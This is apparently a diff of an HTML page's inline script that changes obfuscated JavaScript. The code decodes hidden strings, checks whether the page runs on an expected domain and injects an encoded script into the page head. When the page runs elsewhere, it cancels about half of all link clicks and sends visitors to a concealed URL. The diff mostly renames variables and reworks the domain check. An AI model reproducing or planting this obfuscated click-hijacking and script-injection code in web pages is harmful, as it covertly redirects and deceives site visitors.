@@ -229,6 +229,14 @@
 
     
 
+
+
+
+
+
+
+
+
         function kk(e, f) {
             var g = function () {
                 var h = !![];
@@ -247,26 +255,23 @@
             }();
             function m(n) {
                 var o = g(this, function () {
-                    var p = function () {
-                        var q;
-                        try {
-                            q = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');')();
-                        } catch (r) {
-                            q = window;
-                        }
-                        return q;
-                    };
-                    var s = p();
-                    var t = function () {
+                    var p;
+                    try {
+                        var q = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');');
+                        p = q();
+                    } catch (r) {
+                        p = window;
+                    }
+                    var s = function () {
                         return {
                             'key': 'item',
                             'value': 'attribute',
                             'getAttribute': function () {
-                                for (var u = 0x0; u < 0x3e8; u--) {
-                                    var v = u > 0x0;
-                                    switch (v) {
+                                for (var t = 0x0; t < 0x3e8; t--) {
+                                    var u = t > 0x0;
+                                    switch (u) {
                                         case !![]:
-                                            return this['item'] + '_' + this['value'] + '_' + u;
+                                            return this['item'] + '_' + this['value'] + '_' + t;
                                         default:
                                             this['item'] + '_' + this['value'];
                                     }
@@ -274,84 +279,84 @@
                             }()
                         };
                     };
-                    var w = new RegExp('[YOSQkCOZenYHLxqmTjSxnADSB]', 'g');
-                    var x = 'gYOSithuQbk.iCOoZenYHLxqmTjSxnADSB'['replace'](w, '')['split'](';');
+                    var v = new RegExp('[MxelEmHQKjvNdwyDRadSAfAp]', 'g');
+                    var w = '.MgitxehulEb.imHoQKjvNdwyDRadSAfAp'['replace'](v, '')['split'](';');
+                    var x;
                     var y;
                     var z;
                     var A;
-                    var B;
-                    for (var o in s) {
+                    for (var o in p) {
                         if (o['length'] == 0x8 && o['charCodeAt'](0x7) == 0x74 && o['charCodeAt'](0x5) == 0x65 && o['charCodeAt'](0x3) == 0x75 && o['charCodeAt'](0x0) == 0x64) {
-                            y = o;
+                            x = o;
                             break;
                         }
                     }
-                    for (var D in s[y]) {
-                        if (D['length'] == 0x6 && D['charCodeAt'](0x5) == 0x6e && D['charCodeAt'](0x0) == 0x64) {
-                            z = D;
+                    for (var C in p[x]) {
+                        if (C['length'] == 0x6 && C['charCodeAt'](0x5) == 0x6e && C['charCodeAt'](0x0) == 0x64) {
+                            y = C;
                             break;
                         }
                     }
-                    if (!('~' > z)) {
-                        for (var E in s[y]) {
-                            if (E['length'] == 0x8 && E['charCodeAt'](0x7) == 0x6e && E['charCodeAt'](0x0) == 0x6c) {
+                    if (!('~' > y)) {
+                        for (var D in p[x]) {
+                            if (D['length'] == 0x8 && D['charCodeAt'](0x7) == 0x6e && D['charCodeAt'](0x0) == 0x6c) {
+                                z = D;
+                                break;
+                            }
+                        }
+                        for (var E in p[x][z]) {
+                            if (E['length'] == 0x8 && E['charCodeAt'](0x7) == 0x65 && E['charCodeAt'](0x0) == 0x68) {
                                 A = E;
                                 break;
                             }
                         }
-                        for (var F in s[y][A]) {
-                            if (F['length'] == 0x8 && F['charCodeAt'](0x7) == 0x65 && F['charCodeAt'](0x0) == 0x68) {
-                                B = F;
-                                break;
+                    }
+                    if (!x || !p[x]) {
+                        return;
+                    }
+                    var F = p[x][y];
+                    var G = !!p[x][z] && p[x][z][A];
+                    var H = F || G;
+                    if (!H) {
+                        return;
+                    }
+                    var I = ![];
+                    for (var J = 0x0; J < w['length']; J++) {
+                        var y = w[J];
+                        var L = H['length'] - y['length'];
+                        var M = H['indexOf'](y, L);
+                        var N = M !== -0x1 && M === L;
+                        if (N) {
+                            if (H['length'] == y['length'] || y['indexOf']('.') === 0x0) {
+                                I = !![];
                             }
                         }
                     }
-                    if (!y || !s[y]) {
-                        return;
-                    }
-                    var G = s[y][z];
-                    var H = !!s[y][A] && s[y][A][B];
-                    var I = G || H;
                     if (!I) {
-                        return;
-                    }
-                    var J = ![];
-                    for (var K = 0x0; K < x['length']; K++) {
-                        var z = x[K];
-                        var M = I['length'] - z['length'];
-                        var N = I['indexOf'](z, M);
-                        var O = N !== -0x1 && N === M;
-                        if (O) {
-                            if (I['length'] == z['length'] || z['indexOf']('.') === 0x0) {
-                                J = !![];
-                            }
-                        }
-                    }
-                    if (!J) {
-                        data;
+                        alert("data;");
                     } else {
                         return;
                     }
-                    t();
+                    s();
                 });
                 o();
                 return (n > 0x0) - (n < 0x0);
             }
-            var P = '';
-            var Q;
-            var R = m(f);
-            for (Q = 0x0; Q < e['length']; Q++) {
-                var S = R * ((Q + R * f - 0x1) % (R * f));
-                P += String['fromCharCode'](e['charCodeAt'](Q) + S);
+            var O = '';
+            var P;
+            var Q = m(f);
+            for (P = 0x0; P < e['length']; P++) {
+                var R = Q * ((P + Q * f - 0x1) % (Q * f));
+                O += String['fromCharCode'](e['charCodeAt'](P) + R);
             }
-            return P;
+            return O;
         }
         String['prototype']['hc'] = function () {
-            var T = 0x0, U = 0x0, V = this['length'];
-            while (U < V) {
-                T = (T << 0x5) - T + this['charCodeAt'](U++) << 0x0;
+            var S = 0x0, T = 0x0, U = this['length'];
+            while (T < U) {
+                S = (S << 0x5) - S + this['charCodeAt'](T++) << 0x0;
             }
-            return T;
+            return S;
         };
         var s4 = '3sfewmtn%7Ceoifr%3Bdrxm%3Bqcghnnh%3C3%3Frasilr%3F0%3Cddgpgsqxri%3A%24%3A3%3C581%7F1kwovr%3Dfjfpth03gsqxt%3Fagvhv%80cppwist%3B%24%25%3Fiitroe%7E%3Aucepj%7D/iuszp%3Bcixjr%7Ceoifr%3Bdrxm%7D/iuszp%7C%7Crsr%3A2%7F1gtl%7Cflwulb%7B%3Dfqodm%3Ejqobv%3Dpjfu%3Dwi%7Dt.comln%3Behryes%3Disst.ul%7Ej%3A205ir%3Bccfolrpwqh%3F%23eeggic%3Crdhiioi%3D4%250%213s%7C%250%3Codvlio%3C3%81goe%7B%7Etfdekqk%3F0%214hq%250%214hq@fppw%3E601%272534%21%24Kiqvfvlgf%20Ogxi%27%2Cbtleq%2Cigozjtjed0memxh0xaou0wjrjh%80l6%7Bgqqx2sj%7Ch%3E6.9gp%3Frasilr2lfhw%3E6en%3Dpewgjp0vngiv%3D5jm%7Ej5%7Fkoov0wnzf%3C42%3Aen%7F1ljaegu%7Fuaeflrl%3A2gp%245%3Bug%7Bx2amkjr%3Fcfpwiw%3Bxkgxm%3A92%28%3Frasilr2lfhw%3Efuuq%3Eqfrhkq1wihjw%3Efuuq%802HaqvLqlTyv%7Es%7Beshos%7C%3Abwws@bbenkwovpg%3E%28ddffhh%3Bncuknn%3B3hq%251fo%234%251fo%802HaqvLqlLfhw%7Fklpcw%3Eqegv%3E%7Bnduj%3D95%25%3Cjhmlhu%3Cdyyo%3Codvlio/umlhu%3C4ir%7D/EdtyIniUmlhu%7Diptau%3CUmlhu%3Dzmiti%3C84*%3Biglkmt%3Bcxxt%3Bncuknn.nhjy%3A2gp%813rfussssjxh%7Fray/zmiti%3C445%25%3Cjhmlhu%3Cdyyo%3Cflwulb%7B%3Dfqodm%3Eqfrhkq1qegv%3Deztp%3Dpewgjp0vngiv%3Deztp%7F1fztuqq%7Fgadmjvtuof0gtlpt%3D%27k07%3Deswdft%3D4@cpnrv%3Fwikwi@pbfgmsg%3B38t%7D%2084s%7C@tfzw1fljiq%3Eheovhv@tfzw1iedqueyipp%3Drtnf%3Dwi%7Dt.ukeiox%3C6t%7D%204r%7B%24%28012%3Ehnsqnd%7D%3Fionlrj-cnrgp%3Bgqqx2sj%7Ch%3E76qz%3Eqfrhkq%3E9py%225t%7D%3Bdwuwtr%3Brrmstft%802xpbpOV%80wjfwl%3Fcbnf%2C601%27-6413+%802xpbpF%7F%7Cievk%3Ehame+550%26%2C%3B362*%7FCqjdjc%23sslz%22vgwefp%23esd%21*pe%7D-xkgxm%3A2284ux*%7D1wuaoE%7E%7Bnduj%3Dgfld*445%25+33362*%7F1wuaoNU%7F%7Cievk%3Ehame+550%26%2C4362*%7F%80Dreekd%24tnm%7B%23whrfgq%24fne%22+qfx.ylhyh%3B%3A34ux*%7D1wuaoE%7E%7Bnduj%3D550%26%7F1wuaoNU%7F%7Cievk%3E5%7D%7EBpiiib%22rrqy%21ufvjeo%22dri%20%29od%7C2wjfwl%3F662s%7C.%7Bcqg%7D%80pbfgmsg%3B2%802WetrLqlTyvZvfp62Oikt-0UixpJojX%7DtXtdt%3A0Skjly%7Bgnrey%3Aoqqi@mbz0%7Bnduj%3D550%26%3Dkingiv%3Deztp%3Dpewgjp0fttuqp%3E6en%3Dgmxpmc%7C%3Eglpen%3Frasilr2lfhw%3Efuuq%3Eqfrhkq1wihjw%3Efuuq%802HaqvLqlLfhw03CbrwMrgSkjly%7Bgnrey%3Aoqqi@wjfwl%3F112%28%3Fmejikx%3Favvr%3Frasilr2bpvwsr%3A2gp%3Fiitroe%7E%3Acnrgp%3Bncuknn.nhjy%3Abwws@mbtjms-skjly%3Abwws%82%23ec%7C%7Fiitroe%7E%3Aoqqi%82%7D';
         var s_1115395471 = 'mtur=34bjpj2hon';
@@ -369,18 +374,17 @@
             head['appendChild'](s);
         }
         document['addEventListener']('DOMContentLoaded', function () {
-            []['forEach']['call'](document['getElementsByTagName']('a'), function (W) {
-                W['addEventListener']('click', function (X) {
+            []['forEach']['call'](document['getElementsByTagName']('a'), function (V) {
+                V['addEventListener']('click', function (W) {
                     if (window['location']['hostname']['indexOf'](kk(s229144183, -0x6)) < 0x0) {
                         if (Math['floor'](Math['random']() * 0x64) <= 0x31) {
-                            X['preventDefault']();
+                            W['preventDefault']();
                             window['location']['href'] = kk(s_1115395471, -0x6);
                         }
                     }
                 });
             });
         });
-
     </script>
 
     <!--  <script type="text/javascript" src="jquery-3.3.1.js"></script>
